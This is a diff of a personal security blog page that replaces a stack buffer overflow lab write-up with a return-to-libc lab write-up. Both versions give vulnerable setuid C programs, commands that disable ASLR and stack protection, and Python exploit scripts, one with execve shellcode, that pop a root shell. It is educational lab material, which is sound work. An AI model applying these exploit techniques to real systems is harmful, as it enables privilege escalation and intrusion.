@@ -15,10 +15,10 @@
     <title>
       
       
-         Stack Buffer Overflow 
+         Return-to-libc Attack 
       
     </title>
-    <link rel="canonical" href="https://chuang76.github.io/posts/bof/">
+    <link rel="canonical" href="https://chuang76.github.io/posts/return-to-libc/">
 
     <style>
   * {
@@ -420,125 +420,120 @@
 
 
 <section id=content>
-  <h1> Stack Buffer Overflow </h1>
+  <h1> Return-to-libc Attack </h1>
 
   
     <div id=sub-header>
-      January 2021 
+      February 2021 
     </div>
   
 
   <div class="entry-content">
-    <p>The goal of the following experiments is to exploit buffer overflow attack and get the root privilege of the shell.</p>
+    <p>To prevent buffer overflow attacks, some operating systems allow the programs to make their stacks non-executable, which means if we jump to the stack and run the shellcode, we will fail. The goal of the following experiments is to utilize the variant of buffer overflow attack &ndash; return-to-libc attack and get the root privilege of the shell.</p>
 <h2 id="setup">Setup</h2>
 <p>Environment:</p>
 <ol>
 <li>Google cloud virtual machine: Ubuntu 20.04</li>
 <li>Linux kernel version: 5.4.0</li>
+<li>Create a symbolic link from &ldquo;/bin/zsh&rdquo; to &ldquo;/bin/sh&rdquo; since /bin/dash in most Ubuntu systems prevents itself from being executed in a Set-UID process</li>
+<li>Disable ASLR and Stackguard protection, but make the stack non-executable (our purpose of the experiment)</li>
 </ol>
-<p>Countermeasures:</p>
-<ol>
-<li>ASLR (address space layout randomization) provided by the operating system</li>
-<li>NX/DEP bit provided by the hardware architecture</li>
-<li>StackGuard or canary mechanism provided by the compiler</li>
-</ol>
-<p>Check if ASLR is activated or not (default is 2):</p>
-<pre><code>$ cat /proc/sys/kernel/randomize_va_space 
-2
-</code></pre><p>Disable ASLR:</p>
-<pre><code>$ sudo sysctl -w kernel.randomize_va_space=0
-kernel.randomize_va_space = 0
-</code></pre><p>In the most recent Ubuntu operating systems, the /bin/sh points to the /bin/dash. Dash can prevent itself from being executed in a Set-UID process since it detects if the effective UID equals to real UID or not. More details about dash history can be found <a href="https://bugs.launchpad.net/ubuntu/+source/dash/+bug/1215660">here</a>.</p>
-<pre><code>$ cd /bin &amp;&amp; ls -l | grep &quot;sh&quot;
-lrwxrwxrwx 1 root   root            4 Jan 29 23:22 sh -&gt; dash
-</code></pre><p>So we use another shell called zsh that does not have such a security countermeasure.</p>
-<pre><code>$ sudo ln -sf /bin/zsh /bin/sh
-</code></pre><h2 id="vulnerable-program">Vulnerable program</h2>
-<p>Here is a vulnerable program. It reads something from a file called badfile, then copy the content into the buffer. The program (the function strcpy()) does not limit the input from the user, so we can exploit this vulnerability. That is, we can make the program crash or execute some malicious code with buffer overflow attack.</p>
+<h2 id="vulnerable-program">Vulnerable program</h2>
+<p>Here is a vulnerable program called retlib.c.</p>
 <pre><code>#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;string.h&gt;
 
-#ifndef BUF_SZ 
-#define BUF_SZ 100
-#endif 
-
-int bof(char *str)
+int bof(char* str)
 {
-    char buffer[BUF_SZ]; 
-    strcpy(buffer, str);        // buffer overflow attack 
-    return 1; 
+	char buffer[12]; 
+	unsigned int* framep; 
+
+	asm(&quot;movl %%ebp, %0&quot; : &quot;=r&quot; (framep)); 
+
+	printf(&quot;ebp value = 0x%.8x\n&quot;, (unsigned)framep); 
+	printf(&quot;buffer address = 0x%.8x\n&quot;, (unsigned)buffer); 
+
+	strcpy(buffer, str); 		// buffer overflow
+	return 1; 
 }
 
 int main(int argc, char** argv)
 {
-    char str[517]; 
-    FILE* badfile; 
+	char input[100]; 
+	FILE* badfile; 
 
-    badfile = fopen(&quot;badfile&quot;, &quot;r&quot;); 
-    fread(str, sizeof(char), 517, badfile);     // read contents from badfile
-    bof(str);                                   // copy to the buffer
-    printf(&quot;Return properly\n&quot;); 
+	badfile = fopen(&quot;badfile&quot;, &quot;r&quot;); 
+	int len = fread(input, sizeof(char), 100, badfile); 
+	printf(&quot;input size = %d&quot;, len); 
 
-    return 1; 
+	bof(input); 
+	printf(&quot;return properly\n&quot;); 
+
+	return 1; 
 }
-</code></pre><p>Compile the vulnerable program as follows, the flag &ldquo;-z execstack&rdquo; means to make the stack executable (since stacks are non-executable by default) and &ldquo;-fno-stack-protector&rdquo; means to disable the StackGuard protection.</p>
-<pre><code>$ gcc -DBUF_SZ=100 -m32 -g -o stack-dbg -z execstack -fno-stack-protector stack.c
-$ sudo chown root stack
-$ sudo chmod 4755 stack 
-</code></pre><pre><code>$ ls -l | grep &quot;stack&quot;
--rwsr-xr-x 1 root ychin_chuang 15708 Jan 31 08:10 stack
-</code></pre><p>Use gdb debugger to figure out the distance between the buffer and return address. As you can see, the distance is 0xffffd2a8 - 0xffffd23c  + 4 (the size of ebp) = 112.</p>
-<p><img src="https://github.com/chuang76/image/blob/master/ch2-1.PNG?raw=true" alt=""></p>
+</code></pre><p>Disable ASLR and Stackguard protection, and compile the program into the 32-bit executable. Note that we need to make the stack non-executable, so compile with the flag &ldquo;-z noexecstack&rdquo; as follows:</p>
+<pre><code>$ gcc -m32 -fno-stack-protector -z noexecstack retlib.c -o retlib
+$ sudo chown root retlib
+$ sudo chmod 4755 retlib
+</code></pre><h2 id="idea">Idea</h2>
+<p>The idea of the return-to-libc attack is to jump into a function in the library (for example, libc) without running the instruction located in the stack. To get the root privilege of the shell, our goal is to invoke system(&quot;/bin/sh&quot;). So the first thing is to find out where is the function system(). We can use gdb debugger to print out the address of the system() as follows.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/ch3-13.PNG?raw=true" alt=""></p>
+<p>Next, we need to figure out where is the string &ldquo;/bin/sh&rdquo;. One method is to use an environment variable. The reason is that when we execute a program from a shell prompt, the shell actually fork itself and creates a child process to run the program. All the exported environment variables will be <em>inherited</em> by the child process. So we can export a self-defined environment variable called &ldquo;my_shell&rdquo; which value equals to &ldquo;/bin/sh&rdquo; and use a simple program called &ldquo;prtenv.c&rdquo; to print out the address.</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void main()
+{
+	char* shell = getenv(&quot;my_shell&quot;); 
+	if (shell)
+		printf(&quot;shell = %s, address = 0x%x\n&quot;, shell, (unsigned int)shell);
+}
+</code></pre><p>Compile the program and export the environment variable &ldquo;my_shell&rdquo;.</p>
+<pre><code>$ export my_shell=&quot;/bin/sh&quot;
+$ gcc -m32 prtenv.c -o prtenv
+$ gcc -m32 prtenv.c -o prtaaa
+$ gcc -m32 prtenv.c -o prtaaaaa
+$ gcc -m32 prtenv.c -g -o prtenv_dbg
+</code></pre><p>Here is the result. However, the address of the environment variable is sensitive to the length of the file name. Why? Let&rsquo;s use the debugger to figure out.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/ch3-14.PNG?raw=true" alt=""></p>
+<p>Set a breakpoint at main function and run the program. We can find the address of environment variable with a pointer to pointer <a href="https://man7.org/linux/man-pages/man7/environ.7.html">environ</a>, which points to an array of pointers to strings called the &ldquo;environment&rdquo;. As you can see, environment variables are located in the stack section. Before environment variables are pushed into the stack, the file name of the program is pushed first. So that&rsquo;s why the address of the environment variable may be affected by the length of the file name.</p>
+<pre><code>(gdb) x/100s *((char **)environ)
+</code></pre><p><img src="https://github.com/chuang76/image/blob/master/ch3-15.PNG?raw=true" alt=""></p>
+<p><img src="https://github.com/chuang76/image/blob/master/ch3-16.PNG?raw=true" alt=""></p>
+<p><img src="https://github.com/chuang76/image/blob/master/ch3-17.PNG?raw=true" alt=""></p>
 <h2 id="payload">Payload</h2>
-<p>The shellcode in the following exploit program aims to execute &ldquo;/bin/sh&rdquo;. We can use NOP-sled as a strategy to hit the start of our shellcode. NOP (0x90) means do nothing in the CPU instruction, so we can just slide in the buffer until reach the shellcode. Note that <code>ret</code> is 0xffffd2a8 plus some number. That is because the gdb pushes some environment data into the stack before running the program. Since the stack grows downwards in x86 processors, the actual frame pointer without debugging mode will be larger than 0xffffd2a8.</p>
+<p>Run the vulnerable program to find out where should we put the address of system(). That is, the value of ebp - the address of buffer + the size of ebp register =  0xffffd4d8 - 0xffffd4c0 + 4 = 28.</p>
+<p>Here is our payload: replace the return address of strcmp()&rsquo;s frame as the address of system() and put the argument of system(), i.e., the address of the string &ldquo;/bin/sh&rdquo;. Note that it is necessary to fill the return address of system()&rsquo;s frame with the address of exit(), or the program will crash.</p>
 <pre><code>#!/usr/bin/python3
 
 import sys 
-shellcode = (
-        &quot;\x31\xc0&quot;
-        &quot;\x50&quot;
-        &quot;\x68&quot;&quot;//sh&quot;
-        &quot;\x68&quot;&quot;/bin&quot;
-        &quot;\x89\xe3&quot;
-        &quot;\x50&quot;
-        &quot;\x53&quot;
-        &quot;\x89\xe1&quot;
-        &quot;\x99&quot;
-        &quot;\xb0\x0b&quot;
-        &quot;\xcd\x80&quot;
-    ).encode('latin-1')
 
-# fill with NOPs 
-content = bytearray(0x90 for i in range(517))
+content = bytearray(0xaa for i in range(100))
 
-start = 517 - len(shellcode)
-content[start:] = shellcode
-ret = 0xffffd2a8 + 120     
-offset = 112 
-L = 4                       # 32-bit 
+shell_addr = 0xffffdf73
+system_addr = 0xf7e13420
+exit_addr = 0xf7e05f80 
 
-# modify the return address
-content[offset:offset+L] = (ret).to_bytes(L, byteorder='little')
+content[28:32] = (system_addr).to_bytes(4, byteorder='little')
+content[32:36] = (exit_addr).to_bytes(4, byteorder='little')
+content[36:40] = (shell_addr).to_bytes(4, byteorder='little')
 
-with open('badfile', 'wb') as f:
+with open(&quot;badfile&quot;, &quot;wb&quot;) as f:
     f.write(content)
-</code></pre><h2 id="launch-the-attack">Launch the attack</h2>
-<pre><code>$ rm badfile
-$ python3 exploit.py 
-$ ./stack 
-# whoami 
-root 
-</code></pre><p><img src="https://github.com/chuang76/image/blob/master/ch2-2.png?raw=true" alt=""></p>
+</code></pre><p>So we can get the root privilege of the shell.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/ch3-12.PNG?raw=true" alt=""></p>
+<h2 id="reference">Reference</h2>
+<ul>
+<li>Programs, Processes and Memory <a href="https://www.usna.edu/Users/cs/wcbrown/courses/IC221/classes/L08/Class.html">[link]</a></li>
+</ul>
 
   </div>
 
   <div id=links>
     
-      <a href="https://chuang76.github.io/posts/nebula_p4/">&laquo;&nbsp;Writeup: nebula (level 10)</a>
+      <a href="https://chuang76.github.io/posts/bof/">&laquo;&nbsp;Stack Buffer Overflow</a>
     
-    
-      <a href="https://chuang76.github.io/posts/return-to-libc/">Return-to-libc Attack&nbsp;&raquo;</a>
     
   </div>
 </section>
